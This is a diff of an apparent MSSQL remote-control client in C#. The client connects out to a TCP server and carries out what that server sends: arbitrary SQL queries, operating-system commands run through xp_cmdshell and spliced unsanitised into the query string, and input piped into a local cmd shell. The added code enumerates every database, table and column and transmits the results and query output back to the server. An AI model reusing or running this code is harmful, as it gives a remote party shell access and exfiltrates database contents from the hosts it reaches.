@@ -10,6 +10,7 @@ using System.Runtime.Serialization;
 using System.Runtime.Serialization.Formatters.Binary;
 using System.Security.Cryptography;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading;
 
 namespace MSATClient
@@ -189,25 +190,82 @@ namespace MSATClient
                             thisLenFlag++;
                         }
                         Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "(字符长度为：" + mess.Length + "；标志位：" + firstFlag + "): " + mess);
-                            if (firstFlag == '0')
+                        if (firstFlag == '0')
+                        {
+                            conn = SqlInfo(tcpClient, conn, mess);
+                        }
+                        else if (firstFlag == '2') {
+                            try
                             {
-                                conn = SqlInfo(tcpClient, conn, mess);
-                            }
-                            else if (firstFlag == '2') {
-                                try
+                                //SqlCommand command = new SqlCommand(mess, conn);
+                                SqlDataAdapter reader = new SqlDataAdapter(mess, conn);
+                                DataSet dataSet = new DataSet();
+                                reader.Fill(dataSet, "SQL");
+                                mess = dataSet.GetXml();
+                                String input = mess;
+                                string pattern = @"<[^/]*>.*</[^/]*>\r\n";
+                                pattern = @"[ *\r\n]*\r\n[^<]*<[^<]*?>";
+                                string replacement = "\r\n";
+                                Regex rgx = new Regex(pattern);
+                                string result = rgx.Replace(input, replacement);
+
+                                pattern = @"</[^<]*>\r\n";
+                                replacement = "_;&,";
+                                rgx = new Regex(pattern);
+                                result = rgx.Replace(result, replacement);
+
+                                pattern = @"\r\n[ ]*\r\n";
+                                replacement = "\r\n";
+                                rgx = new Regex(pattern);
+                                result = rgx.Replace(result, replacement);
+
+                                result = result.Substring(14);
+
+
+                                foreach (DataTable dt in dataSet.Tables)
                                 {
-                                    //SqlCommand command = new SqlCommand(mess, conn);
-                                    SqlDataAdapter reader = new SqlDataAdapter(mess, conn);
-                                    DataSet dataSet = new DataSet();
-                                    reader.Fill(dataSet,"SQL");
-                                    mess = dataSet.GetXml();
-                                if (mess != "<NewDataSet />")
-                                    SendMess(tcpClient, mess, "2");
-                            }
-                                catch (Exception ex)
-                                {
-                                    SendMess(tcpClient,mess + "\r\n" + ex.Message, "9");
+                                    mess = "";
+                                    foreach (DataColumn dc in dt.Columns) //遍历所有的列
+                                    {
+                                        mess = mess + dc.ColumnName + "_;&,";
+                                    }
                                 }
+                                result = mess + "\r\n" + result;
+                                using (StreamWriter sw = new StreamWriter("tmp.csv", false, Encoding.UTF8))
+                                {
+                                    sw.WriteLine(result);
+                                }
+                                //Console.WriteLine(result);
+                                SendMess(tcpClient, result, "2");
+                                /**uint columnsnum = 0;
+                                uint rownum = 0;
+                                foreach (DataTable dt in dataSet.Tables)
+                                {
+                                    mess = "";
+                                    foreach (DataColumn dc in dt.Columns) //遍历所有的列
+                                    {
+                                        mess = mess + dc.ColumnName + "_;,";
+                                        columnsnum++;
+                                    }
+                                    mess = mess + "\r\n";
+                                    foreach (DataRow dr in dt.Rows) ///遍历所有的行
+                                    {
+                                        dr.ToString();
+                                         foreach (DataColumn dc in dt.Columns) //遍历所有的列
+                                        {
+                                            mess = mess + dr[dc] + "_;,";
+                                        }
+                                        mess = mess + "\r\n";
+                                        rownum++;
+                                    }
+                                    mess = columnsnum.ToString() + "_;,_" + rownum.ToString() + "_;,_" + mess;
+                                    SendMess(tcpClient, mess, "2");
+                                }**/
+                            }
+                            catch (Exception ex)
+                            {
+                                SendMess(tcpClient, mess + "\r\n" + ex.Message, "a");
+                            }
                                 /**Byte[] sqlResult = GetStringFormatDataSet(dataSet);
                                 SendMess(tcpClient,Convert.ToString(sqlResult.Length),"2");
                                 try
@@ -219,53 +277,36 @@ namespace MSATClient
                                     Console.WriteLine("TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
                                     System.Environment.Exit(0);
                                 }**/
-                            }
-                            else if (firstFlag == '3')
+                        }
+                        else if (firstFlag == '3')
+                        {
+                            if (!sqlStatus)
                             {
-                                if (!sqlStatus)
-                                {
-                                    SendMess(tcpClient, "数据库未连接，请连接后再试！", "b");
-                                }
-                                else
-                                {
-                                try
-                                {
-                                    SqlDataAdapter reader = new SqlDataAdapter("exec xp_cmdshell '" + mess + "'", conn);
-                                    DataSet dataSet = new DataSet();
-                                    reader.Fill(dataSet, "SQL");
-                                    mess = dataSet.GetXml();
-                                    SendMess(tcpClient, mess, "3");
-                                }
-                                catch (Exception ex)
-                                {
-                                    SendMess(tcpClient, ex.Message, "b");
-                                }
-                                    
-                                    /**SqlCommand MyCommand = new SqlCommand("mess", conn);
-                                    SqlDataAdapter SelectAdapter = new SqlDataAdapter();//定义一个数据适配器
-                                    SelectAdapter.SelectCommand = MyCommand;//定义数据适配器的操作指令
-                                    DataSet MyDataSet = new DataSet();//定义一个数据集
-                                    SelectAdapter.SelectCommand.ExecuteNonQuery();//执行数据库查询指令
-                                    SelectAdapter.Fill(MyDataSet);//填充数据集
-                                    Console.WriteLine(MyDataSet.ToString());**/
-                                }
-                                //conn.
+                                SendMess(tcpClient, "数据库未连接，请连接后再试！", "b");
                             }
-                            else if (firstFlag == '4')
+                            else
                             {
-                                //cmd(tcpClient, mess);
-                                p.StandardInput.WriteLine(mess);
-                                if (mess.Contains("cd "))
-                                    p.StandardInput.WriteLine(" ");
-                                p.StandardInput.AutoFlush = true;
-
-                                //StreamReader reader = p.StandardOutput;//截取输出流
-                                //StreamReader error = p.StandardError;//截取错误信息
-                                //mess = reader.ReadToEnd(); //+ error.ReadToEnd();
-                                //mess = p.StandardOutput.ReadToEnd();
-                                //Console.WriteLine(mess);
-                                //SendMess(tcpClient, mess,"4");
+                            try
+                            {
+                                SqlDataAdapter reader = new SqlDataAdapter("exec xp_cmdshell '" + mess + "'", conn);
+                                DataSet dataSet = new DataSet();
+                                reader.Fill(dataSet, "SQL");
+                                mess = dataSet.GetXml();
+                                SendMess(tcpClient, mess, "3");
                             }
+                            catch (Exception ex)
+                            {
+                                SendMess(tcpClient, ex.Message, "b");
+                            }
+                            }
+                        }
+                        else if (firstFlag == '4')
+                        {
+                            p.StandardInput.WriteLine(mess);
+                            if (mess.Contains("cd "))
+                                p.StandardInput.WriteLine(" ");
+                            p.StandardInput.AutoFlush = true;
+                        }
                     }
                     catch (Exception ex)
                     {
@@ -283,29 +324,6 @@ namespace MSATClient
                 }
                 Console.WriteLine("接收数据线程已关闭！！！");
         }).Start();
-
-            //发送数据
-            /**new Thread(() =>
-            {
-                while (true)
-                {
-                    try
-                    {
-                        String mess;
-                        mess = Console.ReadLine();
-                        mess = StringToUnicode(mess);
-                        mess = "3" + Scale.ToCurr((mess.Length + 3) / (1024 * 1024 * 3)).Substring(1, 2) + mess;
-                        byte[] sendmess = Encoding.UTF8.GetBytes(mess);
-                        //Console.WriteLine(Encoding.UTF8.GetString(sendmess));
-                        tcpClient.Send(sendmess);
-                    }
-                    catch (Exception ex)
-                    {
-                        Console.WriteLine("TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
-                        System.Environment.Exit(0);
-                    }
-                }
-            }).Start();**/
 
             //cmd命令正常
             new Thread(() =>
@@ -394,16 +412,27 @@ namespace MSATClient
         public static void SendMess(Socket tcpClient, String mess , String flag) {
             try
             {
-                Console.WriteLine(mess);
-                if (flag != "2" && flag != "3" && flag != "4")
+                //Console.WriteLine(mess);
+                if (flag != "1" && flag != "2" && flag != "3" && flag != "4")
                     mess = StringToUnicode(mess);
                 else if (flag == "4")
                     mess = "$GabgM" + mess;
-                mess = flag + Scale.ToCurr((mess.Length + 3) / (1024 * 1024 * 3)).Substring(1, 2) + mess;
+                int datanum = ((mess.Length + 3) / (1024 * 1024 * 3)) + 1;
+                mess = flag + Scale.ToCurr(datanum).Substring(1, 2) + mess;
+                for (int i = 0; i < datanum; i++)
+                {
+                    byte[] sendmess = null;
+                    if ((datanum-i) == 1)
+                        sendmess = Encoding.UTF8.GetBytes(mess.Substring(i*1024*1024*3));
+                    else
+                        sendmess = Encoding.UTF8.GetBytes(mess.Substring(i * 1024 * 1024 * 3,1024*1024*3));
+                    //Console.WriteLine(Encoding.UTF8.GetString(sendmess));
+                    tcpClient.Send(sendmess);
+                }
                 //Console.WriteLine(mess);
-                byte[] sendmess = Encoding.UTF8.GetBytes(mess);
+                //byte[] sendmess = Encoding.UTF8.GetBytes(mess);
                 //Console.WriteLine(Encoding.UTF8.GetString(sendmess));
-                tcpClient.Send(sendmess);
+                //tcpClient.Send(sendmess);
             }
             catch (Exception ex)
             {
@@ -483,6 +512,25 @@ namespace MSATClient
                     //mess = dataSet.GetXml();
                     SendMess(tcpClient, mess, "1");
                     SendMess(tcpClient, "3" + dataSet.Tables[0].Rows[0]["Column1"].ToString(), "1");
+
+                    //查询数据库所有表名，字段名
+                    SqlDataAdapter dbreader = new SqlDataAdapter("SELECT Name from Master..SysDatabases ORDER BY Name", conn);
+                    DataSet dbDataSet = new DataSet();
+                    dbreader.Fill(dbDataSet);
+                    DataSet dataSet1 = new DataSet();
+                    //DataRow row = dbDataSet.Tables[0].Rows[0];
+                    SqlDataAdapter tablesReader;
+                    String sqlTableInfo = "";
+                    foreach (DataRow row in dbDataSet.Tables[0].Rows)
+                    {
+                        sqlTableInfo += "SELECT '" + row[0].ToString() + "' as database_name,table_name,column_name FROM " + row[0].ToString() + ".[INFORMATION_SCHEMA].[COLUMNS] order by TABLE_NAME;";
+                        Console.WriteLine("查询表字段名：SELECT '" + row[0].ToString() + "' as database_name,table_name,column_name FROM " + row[0].ToString() + ".[INFORMATION_SCHEMA].[COLUMNS] order by TABLE_NAME");
+                        //dataSet1 = new DataSet();
+                    }
+                    tablesReader = new SqlDataAdapter(sqlTableInfo, conn);
+                    tablesReader.Fill(dataSet1);
+                    mess = dataSet1.GetXml();
+                    SendMess(tcpClient, "4" + mess, "1");
                     //SendMess(tcpClient,"数据库连接成功！","9");
                 }
             }
